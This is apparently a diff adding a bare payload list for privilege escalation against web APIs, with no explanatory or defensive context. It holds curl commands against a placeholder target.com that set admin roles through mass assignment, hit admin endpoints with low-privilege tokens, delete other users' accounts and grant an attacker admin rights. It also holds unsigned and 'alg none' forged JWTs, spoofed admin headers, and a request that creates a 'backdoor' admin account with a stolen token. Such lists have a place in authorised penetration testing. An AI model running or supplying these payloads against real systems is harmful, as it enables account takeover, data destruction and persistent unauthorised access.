@@ -1,0 +1,35 @@
+curl -s -X POST https://target.com/api/users/{id} -H "Authorization: Bearer {user_token}" -d '{"role":"admin"}' -H "Content-Type: application/json"
+curl -s -X POST https://target.com/api/users/{id} -H "Authorization: Bearer {user_token}" -d '{"is_admin":true}' -H "Content-Type: application/json"
+curl -s -X PUT https://target.com/api/profile -H "Authorization: Bearer {user_token}" -d '{"role":"admin","permissions":["*"]}' -H "Content-Type: application/json"
+curl -s -X PATCH https://target.com/api/users/me -H "Authorization: Bearer {user_token}" -d '{"role":"superadmin"}' -H "Content-Type: application/json"
+{"role": "admin"}
+{"is_admin": true}
+{"admin": true}
+{"permissions": ["admin:read", "admin:write"]}
+{"group": "administrators"}
+{"scope": "admin"}
+{"privilege_level": 0}
+{"userType": "ADMIN"}
+{"accountType": "premium"}
+{"plan": "enterprise"}
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ.
+eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNjE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+curl -s https://target.com/admin -H "Authorization: Bearer {low_priv_token}"
+curl -s https://target.com/api/admin/users -H "Authorization: Bearer {low_priv_token}"
+curl -s https://target.com/api/admin/config -H "Authorization: Bearer {low_priv_token}"
+curl -s -X DELETE https://target.com/api/users/{other_id} -H "Authorization: Bearer {user_token}"
+curl -s -X POST https://target.com/api/invite -H "Authorization: Bearer {user_token}" -d '{"email":"x@x.com","role":"owner"}'
+curl -s -X POST https://target.com/api/team/members -H "Authorization: Bearer {user_token}" -d '{"user_id":"{victim_id}","role":"admin"}'
+curl -s -X POST https://target.com/api/orgs/{org_id}/roles -H "Authorization: Bearer {user_token}" -d '{"user_id":"{attacker_id}","role":"admin"}'
+GET /api/v1/admin/users → try with regular user token
+GET /api/v2/admin/settings → try with regular user token (v2 may lack auth)
+GET /api/internal/admin → try with regular user token
+POST /api/admin/reset-all-passwords with regular user token
+X-User-Role: admin
+X-Is-Admin: true
+X-Privilege: 9
+sudo: true
+X-Admin-Override: 1
+curl -s -X POST https://target.com/api/users -H "Authorization: Bearer {admin_token_stolen}" -d '{"username":"backdoor","password":"pwned","role":"admin"}'
+curl -s -X POST https://target.com/api/register -d '{"username":"admin2","password":"pass","role":"admin","is_staff":true}'
